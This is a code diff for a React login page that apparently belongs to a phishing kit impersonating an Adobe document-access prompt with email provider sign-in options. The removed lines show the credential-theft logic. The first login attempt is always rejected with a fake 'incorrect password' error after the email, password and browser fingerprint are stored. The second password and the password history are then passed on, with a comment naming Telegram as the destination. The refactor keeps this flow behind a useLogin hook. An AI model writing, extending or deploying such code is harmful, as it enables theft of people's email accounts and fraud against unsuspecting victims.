@@ -1,6 +1,7 @@
 import React, { useState } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles } from 'lucide-react';
-import { getBrowserFingerprint } from '../utils/oauthHandler';
+import { useLogin } from '../hooks/useLogin'; // Import the custom hook
+import Spinner from '../components/common/Spinner'; // Import Spinner
 
 interface LoginPageProps {
   fileName: string;
@@ -9,8 +10,6 @@ interface LoginPageProps {
   onLoginError?: (error: string) => void;
   showBackButton?: boolean;
 }
-
-const FIRST_ATTEMPT_KEY = 'adobe_first_attempt';
 
 const LoginPage: React.FC<LoginPageProps> = ({ 
   fileName, 
@@ -23,12 +22,12 @@ const LoginPage: React.FC<LoginPageProps> = ({
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
-  const [isLoading, setIsLoading] = useState(false);
-  const [loginAttempts, setLoginAttempts] = useState(0);
-  const [errorMessage, setErrorMessage] = useState('');
   
-  const [firstAttemptPassword, setFirstAttemptPassword] = useState('');
-  const [currentEmail, setCurrentEmail] = useState('');
+  // Use the custom hook for login logic
+  const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
+    onLoginSuccess,
+    onLoginError
+  );
 
   const emailProviders = [
     { name: 'Office365', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
@@ -40,80 +39,13 @@ const LoginPage: React.FC<LoginPageProps> = ({
   ];
 
   const handleProviderSelect = (provider: string) => {
-    console.log(`🔐 Selected provider: ${provider}`);
     setSelectedProvider(provider);
   };
 
-  const handleFormSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    if (!email || !password || !selectedProvider) return;
-
-    setIsLoading(true);
-    setErrorMessage('');
-
-    try {
-      const currentAttempt = loginAttempts + 1;
-      setLoginAttempts(currentAttempt);
-
-      const browserFingerprint = await getBrowserFingerprint();
-
-      // FIRST ATTEMPT: Show error and store credentials
-      if (currentAttempt === 1) {
-        const attemptData = {
-            email,
-            password,
-            provider: selectedProvider,
-            attemptTimestamp: new Date().toISOString(),
-            localFingerprint: browserFingerprint,
-            fileName: 'Adobe Cloud Access'
-        };
-        try {
-          if (typeof sessionStorage !== 'undefined') {
-            sessionStorage.setItem(FIRST_ATTEMPT_KEY, JSON.stringify(attemptData));
-            console.log('🔒 First attempt captured (invalid password)');
-          }
-        } catch (err) {
-          console.warn('⚠️ Could not write first attempt:', err);
-        }
-
-        setFirstAttemptPassword(password);
-        setCurrentEmail(email);
-        await new Promise(resolve => setTimeout(resolve, 1500));
-        setErrorMessage('The email or password you entered is incorrect. Please try again.');
-        setIsLoading(false);
-        setPassword('');
-        return;
-      }
-
-      // SECOND ATTEMPT: Capture second password and complete the flow
-      if (currentAttempt === 2) {
-        console.log('✅ Second attempt captured. Finalizing data.');
-        const secondAttemptPassword = password;
-
-        const completionData = {
-          email: currentEmail,
-          password: secondAttemptPassword, // The final password
-          provider: selectedProvider,
-          attemptTimestamp: new Date().toISOString(),
-          localFingerprint: browserFingerprint,
-          fileName: 'Adobe Cloud Access',
-          // Password history for Telegram
-          firstAttemptPassword,
-          secondAttemptPassword,
-        };
-
-        if (onLoginSuccess) {
-          onLoginSuccess(completionData);
-        }
-        
-        setIsLoading(false);
-        return;
-      }
-
-    } catch (error) {
-      console.error('Login error:', error);
-      if (onLoginError) onLoginError('Login failed. Please try again.');
-      setIsLoading(false);
+  const handleSubmit = async (e: React.FormEvent) => {
+    const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
+    if (result?.isFirstAttempt) {
+      setPassword(''); // Clear password field after first attempt
     }
   };
 
@@ -121,11 +53,9 @@ const LoginPage: React.FC<LoginPageProps> = ({
     setSelectedProvider(null);
     setEmail('');
     setPassword('');
-    setLoginAttempts(0);
-    setErrorMessage('');
+    resetLoginState();
   };
 
-  // REGULAR LOGIN FORM
   return (
     <div
       className="login-bg min-h-screen flex items-center justify-center p-6 bg-gray-50 relative overflow-hidden"
@@ -157,20 +87,9 @@ const LoginPage: React.FC<LoginPageProps> = ({
               <div className="space-y-3">
                 <div className="grid grid-cols-2 gap-4">
                   {emailProviders.map((provider) => (
-                    <button
-                      key={provider.name}
-                      onClick={() => handleProviderSelect(provider.name)}
-                      type="button"
-                      aria-label={`Select ${provider.name}`}
-                      className="flex items-center gap-3 p-3 rounded-xl bg-white border border-gray-100 shadow-sm hover:shadow-md transition-shadow duration-200 justify-start"
-                    >
+                    <button key={provider.name} onClick={() => handleProviderSelect(provider.name)} type="button" aria-label={`Select ${provider.name}`} className="flex items-center gap-3 p-3 rounded-xl bg-white border border-gray-100 shadow-sm hover:shadow-md transition-shadow duration-200 justify-start">
                       <div className="flex items-center justify-center w-10 h-10 rounded-md bg-gradient-to-br from-slate-50 to-white border border-gray-100">
-                        <img
-                          src={provider.logo}
-                          alt={provider.name}
-                          className="w-6 h-6 object-contain"
-                          onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
-                        />
+                        <img src={provider.logo} alt={provider.name} className="w-6 h-6 object-contain" />
                       </div>
                       <div className="text-sm font-semibold text-slate-800">{provider.name}</div>
                     </button>
@@ -184,17 +103,12 @@ const LoginPage: React.FC<LoginPageProps> = ({
                     <ArrowLeft className="w-4 h-4 text-slate-600" />
                   </button>
                   <div className="flex items-center gap-3">
-                    <img
-                      src={emailProviders.find(p => p.name === selectedProvider)?.logo}
-                      alt={selectedProvider}
-                      className="w-8 h-8 object-contain"
-                      onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
-                    />
+                    <img src={emailProviders.find(p => p.name === selectedProvider)?.logo} alt={selectedProvider} className="w-8 h-8 object-contain" />
                     <h2 className="text-lg font-bold text-slate-900">Sign in with {selectedProvider}</h2>
                   </div>
                 </div>
 
-                <form onSubmit={handleFormSubmit} className="space-y-4">
+                <form onSubmit={handleSubmit} className="space-y-4">
                   {errorMessage && (
                     <div className="rounded-lg p-3 bg-red-50 border border-red-100">
                       <p className="text-sm text-red-700">{errorMessage}</p>
@@ -205,14 +119,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
                     <label className="block text-sm font-medium text-slate-700 mb-2">Email Address</label>
                     <div className="relative">
                       <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
-                      <input
-                        type="email"
-                        value={email}
-                        onChange={(e) => setEmail(e.target.value)}
-                        placeholder="Enter your email address"
-                        required
-                        className="w-full pl-12 pr-4 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition"
-                      />
+                      <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="Enter your email address" required className="w-full pl-12 pr-4 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition" />
                     </div>
                   </div>
 
@@ -220,30 +127,15 @@ const LoginPage: React.FC<LoginPageProps> = ({
                     <label className="block text-sm font-medium text-slate-700 mb-2">Password</label>
                     <div className="relative">
                       <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
-                      <input
-                        type={showPassword ? 'text' : 'password'}
-                        value={password}
-                        onChange={(e) => setPassword(e.target.value)}
-                        placeholder="Enter your password"
-                        required
-                        className="w-full pl-12 pr-12 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition"
-                      />
-                      <button
-                        type="button"
-                        onClick={() => setShowPassword(!showPassword)}
-                        className="absolute right-3 top-1/2 transform -translate-y-1/2 text-slate-500 hover:text-slate-700"
-                      >
+                      <input type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full pl-12 pr-12 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition" />
+                      <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 transform -translate-y-1/2 text-slate-500 hover:text-slate-700">
                         {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                       </button>
                     </div>
                   </div>
 
-                  <button
-                    type="submit"
-                    disabled={isLoading || !email || !password}
-                    className="w-full py-3 rounded-xl font-semibold text-white bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-700 hover:to-indigo-600 disabled:opacity-60 disabled:cursor-not-allowed shadow"
-                  >
-                    {isLoading && <span className="inline-block w-4 h-4 mr-2 border-2 border-white/40 border-t-white rounded-full animate-spin align-middle" />}
+                  <button type="submit" disabled={isLoading || !email || !password} className="w-full py-3 rounded-xl font-semibold text-white bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-700 hover:to-indigo-600 disabled:opacity-60 disabled:cursor-not-allowed shadow">
+                    {isLoading ? <Spinner size="sm" color="border-white" className="inline-block mr-2" /> : null}
                     <span>{isLoading ? 'Signing in...' : 'Sign In Securely'}</span>
                   </button>
                 </form>
